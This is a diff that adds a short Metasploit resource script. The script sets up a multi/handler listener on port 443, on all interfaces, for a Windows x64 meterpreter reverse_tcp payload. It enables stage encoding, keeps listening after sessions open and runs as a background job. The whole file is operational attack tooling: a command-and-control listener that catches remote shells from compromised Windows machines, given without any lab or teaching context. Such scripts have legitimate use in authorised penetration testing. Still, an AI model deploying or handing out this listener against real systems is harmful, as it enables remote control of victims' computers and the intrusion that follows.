@@ -1,0 +1,9 @@
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+#set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 443
+set EnableUnicodeEncoding true
+set EnableStageEncoding true
+set ExitOnSession false
+exploit -j 
